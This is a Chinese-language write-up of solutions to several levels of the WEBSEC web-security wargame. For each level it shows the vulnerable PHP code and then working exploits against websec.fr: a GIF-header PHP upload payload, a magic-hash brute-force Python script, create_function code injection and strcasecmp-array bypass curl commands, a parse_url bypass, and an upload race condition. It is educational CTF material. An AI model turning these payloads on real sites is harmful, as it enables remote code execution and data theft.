---
title: WEBSEC-Writeup
date: 2018-09-04 11:47:34
tags:
---

# level8

```php
 <?php
 $uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');

if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }

if ($_FILES['fileToUpload']['size'] <= 50000) {
if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
echo '<pre>';
include_once($uploadedFile);
echo '</pre>';
unlink($uploadedFile);
} else { echo '<p class="text-danger">The file is not a GIF</p>'; }
} else { echo '<p class="text-danger">The file is not an image</p>'; }
} else { echo '<p class="text-danger">The file is too big</p>'; }
?>
</div>
<?php endif ?>
```

这里使用`exif_imagetype`函数检测图片是否是GIF，该函数仅检查开头几个字节。

payload, 列目录:

```
GIF89
<?php 
	echo "shell"; $dr = @opendir('./');   
	while(($files[] = readdir($dr)) !== false);
   	print_r($files);?>
```

结果：

```
Array
(
    [0] => .
    [1] => uploads
    [2] => ..
    [3] => flag.txt
    [4] => source.php
    [5] => index.php
    [6] => php-fpm.sock
    [7] => 
)
```

查看flag.txt:

```
GIF89
<?php 
	var_dump(file_get_contents("flag.txt"));	
?>
```

# level10

```php
<?php
if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
$file = $_REQUEST['f'];
$request = $_REQUEST['hash'];

$hash = substr (md5 ($flag . $file . $flag), 0, 8);

echo '<div class="row"><br><pre>';
if ($request == $hash) {
show_source ($file);
} else {
echo 'Permission denied!';
}
echo '</pre></div>';
}
?>
```

知识点:

```shell
php > var_dump("0" == "0e251234");
bool(true)
php > var_dump("0" == "0e2abcde");
bool(false)
```

令`hash`为`0`。

通过构造 `f = '.' + '/' * i + 'flag.php'`,让后爆破即可。

```python
#!/usr/bin/python
# coding: utf-8
from requests import *
import sys
url = 'http://websec.fr/level10/index.php'
f = './flag.php'
i = 880
data = {
    'f': f,
    'hash': 0,
}
while True:
    i += 1
    r = post(url, data=data)
    if 'Permission denied!' in r.content:
        f = '.' + '/' * i + 'flag.php'
    else:
        print('[*] successful payload : {0}'.format(f))
        print(r.content)
        sys.exit(0)
```

# level15

```php
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

$success = '
<div class="alert alert-success alert-dismissible" role="alert">
    <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
    Function declared.
</div>
';

include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
?>
```

`create_function`参数可控，可以代码执行。

payload: `echo 2;}echo $flag;/*`

> curl -v -d "c=%65%63%68%6f%20%32%3b%7d%65%63%68%6f%20%24%66%6c%61%67%3b%2f%2a" https://websec.fr/level15/index.php | grep -Eo "WEBSEC{.*?}"
>
> curl -v -d "c=echo 2;}echo \\$flag;/*&q=0" https://websec.fr/level15/index.php

# level17

```php
<?php
if (! strcasecmp ($_POST['flag'], $flag))
echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
else
echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
?>
```

传递数组即可绕过`strcasecmp`检测。

> curl http://websec.fr/level17/index.php -d "flag[]=" | grep -Eo "WEBSEC{.*}"

# level25

```php
<?php
    parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
    foreach ($query as $k => $v) {
    if (stripos($v, 'flag') !== false)
    die('You are not allowed to get the flag, sorry :/');
    }

    include $_GET['page'] . '.txt';
    ?>
```

`parse_url`绕过:

payload:

> curl http://websec.fr///level25/index.php?page=flag | grep -Eo "WEBSEC{.*}"

# level28

```php
<?php
if(isset($_POST['submit'])) {
  if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
  $filename = md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

    file_put_contents($filename, $flagfilecontent);
  if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {
    include($filename);  // it contains the `$flag` variable
    } else {
        $flag = "Nope, $filename is not the right file, sorry.";
        sleep(1);  // Deter bruteforce
    }

  unlink($filename);
}
?>
```

条件竞争:

1.php:

```php
<?php
        var_dump(file_get_contents("flag.php"));
```

上传文件:

>  curl https://websec.fr/level28/index.php -F "flag_file=@1.php" -F "submit=1"

然后不断访问: https://websec.fr/level28/53fdb7c766848a88eabc80476d3e42c6.php 即可。

